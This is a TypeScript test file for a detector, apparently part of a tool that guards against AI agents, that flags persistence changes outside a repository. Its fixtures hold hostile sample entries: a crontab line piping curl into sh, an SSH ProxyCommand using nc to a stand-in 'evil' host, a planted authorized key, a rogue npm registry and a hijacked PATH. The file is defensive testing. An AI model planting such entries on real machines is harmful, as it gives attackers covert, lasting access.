import { describe, expect, it } from 'vitest';
import { PERSISTENCE_RULES } from '../../../../src/domain/rules/persistence/index.js';
import { RuleRegistry } from '../../../../src/domain/rules/RuleRegistry.js';
import { ScanEngine } from '../../../../src/domain/services/ScanEngine.js';
import { BaselineChange, type ChangeKind } from '../../../../src/domain/entities/BaselineChange.js';
import { AbsolutePath } from '../../../../src/domain/value-objects/AbsolutePath.js';
import { ContentHash } from '../../../../src/domain/value-objects/ContentHash.js';
import type { PathContext } from '../../../../src/domain/paths/PathContext.js';

const HOME = AbsolutePath.of('/Users/dev');
const CTX: PathContext = {
  home: HOME,
  workspace: AbsolutePath.of('/Users/dev/projects/app'),
  platform: 'darwin',
};

const engine = new ScanEngine(RuleRegistry.of(PERSISTENCE_RULES));

const change = (
  raw: string,
  content: string | null = null,
  kind: ChangeKind = 'modified',
  sandboxActive = false,
): BaselineChange =>
  new BaselineChange({
    path: AbsolutePath.fromUserPath(raw, HOME),
    kind,
    previousHash: ContentHash.fromContent('before'),
    currentHash: content === null ? null : ContentHash.fromContent(content),
    content,
    context: CTX,
    sandboxActive,
  });

const ids = (subject: BaselineChange): string[] =>
  engine.scan([subject]).findings.map((finding) => finding.ruleId.toString());

describe('family P — persistence outside the repository', () => {
  it('AG-P001 reports a change to ~/.zshenv', () => {
    expect(ids(change('~/.zshenv', 'export PATH=/evil:$PATH'))).toContain('AG-P001');
  });

  it('AG-P002 reports a change to ~/.zshrc', () => {
    expect(ids(change('~/.zshrc', 'source ~/.evil'))).toContain('AG-P002');
  });

  it('AG-P003 reports core.hooksPath appearing in the global git config', () => {
    expect(ids(change('~/.gitconfig', '[core]\n\thooksPath = ~/.evil-hooks\n'))).toContain(
      'AG-P003',
    );
  });

  it('AG-P003 stays quiet for an ordinary git config edit', () => {
    expect(ids(change('~/.gitconfig', '[user]\n\temail = dev@example.com\n'))).not.toContain(
      'AG-P003',
    );
  });

  it('AG-P004 reports a new launch agent', () => {
    expect(ids(change('~/Library/LaunchAgents/x.plist', '<plist/>', 'created'))).toContain(
      'AG-P004',
    );
  });

  it('AG-P005 reports a crontab change', () => {
    expect(ids(change('/private/var/at/tabs/dev', '* * * * * curl evil|sh'))).toContain('AG-P005');
  });

  it('AG-P006 reports a new authorized key', () => {
    expect(ids(change('~/.ssh/authorized_keys', 'ssh-ed25519 AAAA... evil@host'))).toContain(
      'AG-P006',
    );
  });

  it('AG-P006 reports ProxyCommand appearing in the ssh config', () => {
    expect(ids(change('~/.ssh/config', 'Host *\n  ProxyCommand nc evil 1234\n'))).toContain(
      'AG-P006',
    );
  });

  it('AG-P007 reports a registry change in ~/.npmrc', () => {
    expect(ids(change('~/.npmrc', 'registry=https://evil.example/'))).toContain('AG-P007');
  });

  it('AG-P007 stays quiet for an unrelated npmrc setting', () => {
    expect(ids(change('~/.npmrc', 'save-exact=true'))).not.toContain('AG-P007');
  });

  it('AG-P008 reports agent settings changing outside agent-guard', () => {
    expect(ids(change('~/.claude/settings.json', '{"hooks":{"SessionStart":[]}}'))).toContain(
      'AG-P008',
    );
  });

  it('ignores an unrelated file', () => {
    expect(ids(change('~/Documents/notes.txt', 'hello'))).toEqual([]);
  });

  describe('escalation when isolation was active (spec §6.6)', () => {
    it('raises severity one level', () => {
      const quiet = engine.scan([change('~/.zshrc', 'x', 'modified', false)]).findings[0];
      const alarming = engine.scan([change('~/.zshrc', 'x', 'modified', true)]).findings[0];
      expect(quiet?.severity.name).toBe('high');
      expect(alarming?.severity.name).toBe('critical');
    });

    it('says plainly that isolation was bypassed', () => {
      const finding = engine.scan([change('~/.zshenv', 'x', 'modified', true)]).findings[0];
      expect(finding?.detail).toMatch(/got around it/);
    });

    it('cannot raise past critical', () => {
      const finding = engine.scan([change('~/.zshenv', 'x', 'modified', true)]).findings[0];
      expect(finding?.severity.name).toBe('critical');
    });
  });

  it('gives every rule remediation and a title', () => {
    for (const rule of PERSISTENCE_RULES) {
      expect(rule.remediation.length).toBeGreaterThan(20);
      expect(rule.title.length).toBeGreaterThan(5);
    }
  });
});
